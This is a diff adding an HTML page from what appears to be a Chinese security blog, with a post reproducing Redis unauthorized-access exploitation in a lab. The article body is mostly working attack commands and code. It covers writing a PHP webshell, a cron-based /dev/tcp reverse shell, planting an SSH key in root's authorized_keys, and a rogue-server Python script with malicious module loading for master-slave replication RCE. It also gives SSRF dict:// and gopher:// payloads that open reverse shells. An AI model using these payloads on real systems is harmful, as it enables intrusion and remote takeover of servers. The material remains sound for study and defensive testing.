@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <title>
+        redis未授权 - AD钙奶的博客
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="redis未授权" />
+    <meta name="generator" content="Hugo 0.87.0 with theme pure" />
+    <title>redis未授权 - AD钙奶的博客</title>
+    
+    
+    <link rel="stylesheet" href="https://ad-calcium.github.io/css/style.min.e64d754037c0ee0ec4e20ab1d6f07740ace61729bc03850559b8caa21ae4a597.css">
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="redis未授权" />
+<meta property="og:description" content="redis未授权" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ad-calcium.github.io/2021/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-07-09T00:00:00+00:00" />
+
+<meta itemprop="name" content="redis未授权">
+<meta itemprop="description" content="redis未授权"><meta itemprop="datePublished" content="2021-07-09T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-07-09T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1863">
+<meta itemprop="keywords" content="漏洞复现,未授权," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="redis未授权"/>
+<meta name="twitter:description" content="redis未授权"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/ad-calcium" target="_blank">
+            <img class="img-circle img-rotate" src="https://ad-calcium.github.io/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">AD钙奶</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="想要查找什么..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><p>十年寒窗无人问，一举成名天下知。</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div id="tag-cloud-list" class="widget-body">
+            
+            
+            <a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link" rel="1">mssql<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link" rel="5">web安全<span
+               class="tag-list-count">5</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="1">web渗透<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link" rel="3">内网<span
+               class="tag-list-count">3</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="2">内网渗透<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link" rel="1">安装博客<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="tag-list-link" rel="1">小技巧<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link" rel="1">未授权<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="tag-list-link" rel="1">流量代理<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link" rel="10">漏洞复现<span
+               class="tag-list-count">10</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link" rel="1">软件安装<span
+               class="tag-list-count">1</span></a>
+            
+    </div>
+<script>
+document.onreadystatechange = () => {
+  if (document.readyState === 'complete') {
+    tagCloud('#tag-cloud-list a',  15 ,  30 );
+  }
+};
+
+function tagCloud(where, min, max) {
+  let iMax = 0;
+  let iMin = 0;
+  $(where).each(function() {
+    let weight = Number($(this).attr("rel"));
+    if(iMax < weight) iMax = weight;
+    if(iMin > weight || iMin == 0) iMin = weight;
+  });
+  let step = (max - min)/(iMax - iMin);
+  $(where).each(function() {
+    let weight = $(this).attr("rel") - iMin;
+    $(this).css({"font-size": min + (weight * step) + 'px'});
+  });
+};
+</script>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 分类</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/sql%E6%B3%A8%E5%85%A5/" class="category-list-link">sql注入</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/" class="category-list-link">web安全</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-list-link">内网渗透</a><span class="category-list-count">2</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="category-list-link">小技巧</a><span class="category-list-count">2</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="category-list-link">未授权漏洞</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-list-link">漏洞复现</a><span class="category-list-count">8</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link">mssql</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link">web安全</a><span
+                    class="tag-list-count">5</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link">web渗透</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link">内网</a><span
+                    class="tag-list-count">3</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link">内网渗透</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link">安装博客</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="tag-list-link">小技巧</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link">未授权</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="tag-list-link">流量代理</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link">漏洞复现</a><span
+                    class="tag-list-count">10</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link">软件安装</a><span
+                    class="tag-list-count">1</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/%E6%9F%90%E4%BF%A1xxx%E8%AE%BE%E5%A4%87%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="title">某信xxx设备存在任意文件读取漏洞</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-30</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/cve-2021-36934%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="title">CVE-2021-36934 漏洞复现</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-26 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-26</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/jdc%E6%9C%AA%E6%8E%88%E6%9D%83/" class="title">jdc未授权访问</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-26 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-26</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/cve-2021-1675%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="title">CVE-2021-1675 漏洞复现</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-24 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-24</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/ezoffice%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="title">ezOFFICE 任意文件上传</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-24 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-24</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">文章目录</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2021/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/"
+    >redis未授权</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://ad-calcium.github.io/2021/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/" class="article-date">
+  <time datetime="2021-07-09 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-09</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"> 未授权漏洞 </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"> 漏洞复现 </a>
+    <a class="article-tag-link" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/"> 未授权 </a>
+  </span>
+
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1863字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 4分 </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h2 id="redis介绍">Redis介绍</h2>
+<p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库。</p>
+<p>###安装教程</p>
+<pre><code>第1步：Redis下载
+wget http://download.redis.io/releases/redis-3.2.11.tar.gz
+
+第2步：Redis解压、编译
+tar zxvf redis-3.2.11.tar.gz
+cd redis-3.2.11
+make      #编译失败也可以的，不影响
+make install
+进入 redis.conf 文件，还原漏洞现场，修改配置文件
+</code></pre>
+<p>vim redis.conf
+新版中这里是127.0.0.1，将他注释掉或者改为0.0.0.0</p>
+<p><img src="./images/image-20210711200938714.png" alt=""></p>
+<p>将保护模式改为no</p>
+<p><img src="./images/image-20210711200946719.png" alt=""></p>
+<p>完成之后启动服务</p>
+<pre><code>redis-server redis.conf     启动服务
+redis-cli shutdown          关闭服务
+</code></pre>
+<p>关闭防火墙命令：  service iptables stop 
+永久关闭防火墙：chkconfig iptables off</p>
+<p>永久有效：修改/etc/sysconfig/selinux
+将SELINUX=enforcing，改为SELINUX=disabled。然后重启
+即时有效：setenforce  0</p>
+<p>在kali下安装redis-cli</p>
+<pre><code>wget http://download.redis.io/releases/redis-2.8.12.tar.gz        下载
+
+tar -xzf redis-2.8.12.tar.gz   # 解压
+cd redis-2.8.12                   #cd进入redis目录
+make                                 #make安装
+
+进入src目录
+cd src
+./redis-cli -h            如果这个命令出现帮助界面说明可以正常使用
+
+连接靶机
+./redis-cli -h 192.168.62.137 -p 6379
+</code></pre>
+<p>尝试输入命令info，可以成功执行</p>
+<p><img src="./images/20200830131234601_16307.png" alt=""></p>
+<p>查看所有秘钥（我这表示为空，没有秘钥）</p>
+<pre><code>keys *
+</code></pre>
+<p><img src="./images/20200830131206022_13332.png" alt=""></p>
+<h2 id="攻击利用">攻击利用</h2>
+<h3 id="写入文件">写入文件</h3>
+<pre><code>设置路径，把shell写入到网站根目录下（/var/www/html/）
+CONFIG SET dir /var/www/html/
+
+修改备份文件名
+CONFIG SET dbfilename 1.php
+
+写入内容
+SET webshell &quot;&lt;?php phpinfo();?&gt;&quot;
+save
+</code></pre>
+<p><img src="./images/20200830131938516_23742.png" alt=""></p>
+<p>查看是否写入成功</p>
+<p><img src="./images/20200830132035506_28059.png" alt=""></p>
+<h3 id="反弹shell">反弹shell</h3>
+<p>在kali里开启监听</p>
+<p><code>nc -lvvp 9999</code></p>
+<p><img src="./images/20200830134113988_7443.png" alt=""></p>
+<pre><code>set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.239143/9999 0&gt;&amp;1\n\n&quot;
+config set dir /var/spool/cron
+config set dbfilename root
+save
+</code></pre>
+<p><img src="./images/20200830134104250_5934.png" alt=""></p>
+<p>等待一分钟，kali已经成功接收shell</p>
+<p><img src="./images/20200830134137535_14711.png" alt=""></p>
+<h3 id="通过写入ssh公钥实现ssh登录">通过写入SSH公钥实现SSH登录</h3>
+<p>原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生一个授权的key。</p>
+<p>在kali生成ssh公钥 (一路回车即可)
+<code>ssh-keygen -t rsa</code></p>
+<p><img src="./images/20200830135437612_24128.png" alt=""></p>
+<p>查看id_rsa.pub</p>
+<pre><code>cat /root/.ssh/id_rsa.pub
+</code></pre>
+<p><img src="./images/20200830140049723_1249.png" alt=""></p>
+<p>执行redis命令</p>
+<pre><code>config set dir /root/.ssh/
+config set dbfilename authorized_keys
+set x &quot;\n\n\nssh-rsa 这里填id_rsa.pub的内容 root@kali\n\n\n&quot;
+save
+
+清空数据库
+FLUSHALL
+</code></pre>
+<p><img src="./images/20200830135900603_13683.png" alt=""></p>
+<h3 id="redis主从复制getshell">Redis主从复制getshell</h3>
+<p>原理：
+利用主从特性传输数据，通过模块加载，增加执行命令的函数。</p>
+<p>下载镜像
+<code>docker pull damonevking/redis5.0</code></p>
+<p>映射端口并运行容器
+<code>docker run -p 6379:6379 -d damonevking/redis5.0 redis-server </code></p>
+<h4 id="自动化工具">自动化工具</h4>
+<p>exp下载地址：
+<a href="https://github.com/Ridter/redis-rce">redis-rce</a>
+<a href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-server</a></p>
+<p>环境编译</p>
+<pre><code>git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+cd RedisModules-ExecuteCommand/
+make
+
+git clone https://github.com/Ridter/redis-rce.git
+cd redis-rce/
+cp ../RedisModules-ExecuteCommand/src/module.so ./
+pip install -r requirements.txt 
+python redis-rce.py -r 136.244.70.243（目标ip) -L 136.244.70.243（自己的ip） -f module.so
+</code></pre>
+<p>python3 redis-rce.py -r 136.244.70.243（目标ip) -L 136.244.70.243（自己的ip） -f exp.so</p>
+<p><img src="./images/20200830154554247_26228.png" alt=""></p>
+<h4 id="手动">手动</h4>
+<p>利用docker开启2台redis容器用于复现主从复制。</p>
+<p>下载镜像
+<code>docker pull damonevking/redis5.0</code></p>
+<p>映射端口并运行容器</p>
+<pre><code>docker run -p 6379:6379 -d damonevking/redis5.0 redis-server
+docker run -p 6666:6379 -d --name redis-service-3 damonevking/redis5.0
+</code></pre>
+<p>首先进入主redis</p>
+<pre><code>set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
+get webshell
+</code></pre>
+<p><img src="./images/20200830180525908_13754.png" alt=""></p>
+<p>在本地 redis 设置远程服务器 redis 服务器为主服务器，同步远程服务器 redis 的内容</p>
+<pre><code>slaveof 192.168.72.196 6379
+role
+get shell
+</code></pre>
+<p><img src="./images/20200830180541685_26404.png" alt=""></p>
+<p>写shell</p>
+<pre><code>config set dir /data/
+config set dbfilename 11.txt
+save
+</code></pre>
+<p><img src="./images/20200830180625681_12874.png" alt=""></p>
+<pre><code>关闭同步
+SLAVEOF NO ONE
+
+清除缓存
+flushall
+</code></pre>
+<p>编写脚本，构造恶意Redis服务器，监听本地端口1234，加载exp.so。
+python RogueServer.py &ndash;lport 1234 &ndash;exp exp.so</p>
+<p><img src="./images/20200830181944782_11932.png" alt=""></p>
+<pre><code>config set dir ./               #设置redis的备份路径为当前目录
+config set dbfilename exp.so    #设置备份文件名为exp.so，默认为dump.rdb
+slaveof 192.168.172.129 1234    #设置主服务器IP和端口
+module load ./exp.so            #加载恶意模块
+slaveof no one                  #切断主从，关闭复制功能
+system.exec 'whoami'            #执行系统命令
+system.rev 127.0.0.1 9999    
+config set dbfilename dump.rdb  #通过dump.rdb文件恢复数据
+system.exec 'rm ./exp.so'       #删除exp.so
+module unload system            #卸载system模块的加载
+</code></pre>
+<p>成功执行系统命令</p>
+<p><img src="./images/20200830181812427_5720.png" alt=""></p>
+<p>Redis服务端模拟脚本</p>
+<pre><code>import socket
+from time import sleep
+from optparse import OptionParser
+
+def RogueServer(lport):
+    resp = &quot;&quot;
+    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind((&quot;0.0.0.0&quot;,lport))
+    sock.listen(10)
+    conn,address = sock.accept()  
+    sleep(5)
+    while True:    
+        data = conn.recv(1024)
+        if &quot;PING&quot; in data:
+            resp=&quot;+PONG&quot;+CLRF
+            conn.send(resp)
+        elif &quot;REPLCONF&quot; in data:
+            resp=&quot;+OK&quot;+CLRF
+            conn.send(resp)
+        elif &quot;PSYNC&quot; in data or &quot;SYNC&quot; in data:
+            resp =  &quot;+FULLRESYNC &quot; + &quot;Z&quot;*40 + &quot; 1&quot; + CLRF
+            resp += &quot;$&quot; + str(len(payload)) + CLRF
+            resp = resp.encode()
+            resp += payload + CLRF.encode()
+            if type(resp) != bytes:
+                resp =resp.encode()            
+            conn.send(resp)    
+        #elif &quot;exit&quot; in data:
+            break
+
+
+if __name__==&quot;__main__&quot;:
+
+    parser = OptionParser()                     
+    parser.add_option(&quot;--lport&quot;, dest=&quot;lp&quot;, type=&quot;int&quot;,help=&quot;rogue server listen port, default 21000&quot;, default=21000,metavar=&quot;LOCAL_PORT&quot;)        
+    parser.add_option(&quot;-f&quot;,&quot;--exp&quot;, dest=&quot;exp&quot;, type=&quot;string&quot;,help=&quot;Redis Module to load, default exp.so&quot;, default=&quot;exp.so&quot;,metavar=&quot;EXP_FILE&quot;)            
+
+    (options , args )= parser.parse_args()
+    lport = options.lp
+    exp_filename = options.exp
+
+    CLRF=&quot;\r\n&quot;
+    payload=open(exp_filename,&quot;rb&quot;).read()
+    print &quot;Start listing on port: %s&quot; %lport
+    print &quot;Load the payload:   %s&quot; %exp_filename     
+    RogueServer(lport)
+</code></pre>
+<h3 id="ssrfredis-反弹shell">SSRF+Redis 反弹shell</h3>
+<p>参照Redis手动getshell的过程，可轻易实现SSRF+Redis反弹shell。</p>
+<p>以curl为例，漏洞代码为ssrf.php:</p>
+<pre><code>&lt;?php
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $_GET['url']);
+#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
+curl_exec($ch);
+curl_close($ch);
+?&gt;
+</code></pre>
+<p>环境准备：
+模拟内网未授权Redis服务器：192.168.172.131
+模拟攻击者机器：192.168.172.129
+在攻击者机器上构建恶意Redis服务器，同时监听本地9999端口等待shell返回。</p>
+<p>1、利用dict协议反弹shell</p>
+<pre><code>#查看当前redis的相关配置
+ssrf.php?url=dict://192.168.172.131:6379/info
+
+#设置备份文件名
+ssrf.php?url=dict://192.168.172.131:6379/config:set:dbfilename:exp.so
+
+#连接恶意Redis服务器
+ssrf.php?url=dict://192.168.172.131:6379/slaveof:192.168.172.129:1234
+
+#加载恶意模块
+ssrf.php?url=dict://192.168.172.131:6379/module:load:./exp.so
+
+#切断主从复制
+ssrf.php?url=dict://192.168.172.131:6379/slaveof:no:one
+
+#执行系统命令
+ ssrf.php?url=dict://192.168.172.131:6379/system.rev:192.168.172.129:9999
+</code></pre>
+<p>2、利用gopher协议反弹shell</p>
+<pre><code>#设置文件名，连接恶意Redis服务器
+gopher://192.168.172.131:6379/_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.172.129%25201234%250d%250aquit
+
+#加载exp.so，反弹shell
+gopher://192.168.172.131:6379/_module%2520load%2520./exp.so%250d%250asystem.rev%2520192.168.172.129%25209999%250d%250aquit
+</code></pre>
+<p>3、利用这两种协议，都可以成功获取shell。</p>
+<p><img src="./images/20200830182410675_6581.png" alt=""></p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接: </strong>
+      <a href="https://ad-calcium.github.io/2021/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/" title="redis未授权" target="_blank" rel="external">https://ad-calcium.github.io/2021/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License: </strong>
+        <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ad-calcium" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://ad-calcium.github.io/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ad-calcium" target="_blank"><span class="text-dark">AD钙奶</span><small class="ml-1x"></small></a></h3>
+        <div>Good Good Study, Day Day Up~</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://ad-calcium.github.io/2021/07/smb%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5/" title="SMB外带注入"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
+            </li>
+            <li class="next">
+                <a href="https://ad-calcium.github.io/2021/07/netlogon-%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2020-1472/"
+                    title="NetLogon 域内提权漏洞（CVE-2020-1472）"><span>上一篇&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="文章目录" role="button">
+                    <span>[&nbsp;</span><span>文章目录</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter"
+                data-mobile-sites="weibo,qq,qzone"></div>
+        </div>
+    </div>
+</nav>
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+  <div class="copyright">
+    &copy;2020  -
+    2021
+
+    
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
